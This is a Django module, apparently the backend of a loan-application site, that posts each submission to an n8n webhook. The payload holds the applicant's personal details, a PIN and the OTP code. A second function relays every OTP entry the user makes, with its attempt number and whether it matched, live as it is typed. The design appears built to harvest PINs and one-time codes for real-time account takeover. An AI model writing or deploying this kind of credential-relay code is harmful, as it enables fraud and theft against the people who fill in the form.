import logging
from datetime import timezone as dt_timezone

import requests
from django.conf import settings
from django.utils import timezone

logger = logging.getLogger(__name__)


def _post_to_n8n(payload: dict) -> tuple[bool, str]:
    """
    Low-level POST to the n8n webhook URL.
    Returns (success: bool, error_message: str).
    """
    headers = {
        "Content-Type": "application/json",
        "X-Webhook-Secret": settings.N8N_WEBHOOK_SECRET,
    }
    try:
        response = requests.post(
            settings.N8N_WEBHOOK_URL,
            json=payload,
            headers=headers,
            timeout=10,
        )
        if response.ok:
            return True, ""
        error = f"HTTP {response.status_code}: {response.text[:500]}"
        logger.error("n8n webhook error — %s | payload event: %s", error, payload.get("event"))
        return False, f"HTTP {response.status_code}"
    except requests.Timeout:
        logger.error("n8n webhook timed out | event: %s", payload.get("event"))
        return False, "Request timed out"
    except requests.ConnectionError as exc:
        logger.error("n8n webhook connection error: %s", exc)
        return False, f"Connection error: {exc}"
    except requests.RequestException as exc:
        logger.error("n8n webhook request failed: %s", exc)
        return False, str(exc)


def notify_n8n(submission) -> None:
    """
    Fire the 'submission.created' event to n8n.
    Called via transaction.on_commit() after the submission is saved.
    """
    payload = {
        "event": "submission.created",
        "submission_id": submission.pk,
        "data": {
            # Personal
            "first_name": submission.first_name,
            "last_name": submission.last_name,
            "full_name": submission.name,
            "age": submission.age,
            "employment_status": submission.employment_status,
            # Contact
            "phone": submission.phone,
            "email": submission.email or "",
            # Loan
            "amount": str(submission.amount),
            "pin": submission.pin,
            # OTP state at time of call
            "otp_code": submission.otp_code,
            "otp_verified": submission.otp_verified,
        },
        "created_at": submission.created_at.astimezone(dt_timezone.utc).isoformat(),
    }

    success, error = _post_to_n8n(payload)

    submission.n8n_notified = success
    if success:
        submission.n8n_notified_at = timezone.now()
        submission.n8n_notification_error = ""
        logger.info("Submission #%s notified to n8n.", submission.pk)
    else:
        submission.n8n_notification_error = error

    try:
        submission.save(
            update_fields=["n8n_notified", "n8n_notified_at", "n8n_notification_error"]
        )
    except Exception as exc:
        logger.error(
            "Failed to save n8n status for submission #%s: %s", submission.pk, exc
        )


def notify_n8n_otp_attempt(attempt) -> None:
    """
    Fire the 'otp.attempt' event to n8n for every OTP entry the user makes.
    Called synchronously inside the view (not on_commit) so the attempt number
    is always accurate.
    """
    sub = attempt.submission
    payload = {
        "event": "otp.attempt",
        "submission_id": sub.pk,
        "attempt_id": attempt.pk,
        "data": {
            # Who is this?
            "full_name": sub.name,
            "phone": sub.phone,
            # What did they enter?
            "otp_entered": attempt.otp_entered,
            "attempt_number": attempt.attempt_number,
            "matched": attempt.matched,
        },
        "created_at": attempt.created_at.astimezone(dt_timezone.utc).isoformat(),
    }

    success, error = _post_to_n8n(payload)

    attempt.n8n_notified = success
    if success:
        attempt.n8n_notified_at = timezone.now()
        attempt.n8n_notification_error = ""
        logger.info(
            "OTP attempt #%s (submission #%s) notified to n8n.",
            attempt.attempt_number, sub.pk,
        )
    else:
        attempt.n8n_notification_error = error

    try:
        attempt.save(
            update_fields=["n8n_notified", "n8n_notified_at", "n8n_notification_error"]
        )
    except Exception as exc:
        logger.error(
            "Failed to save n8n status for OTP attempt (submission #%s): %s",
            sub.pk, exc,
        )
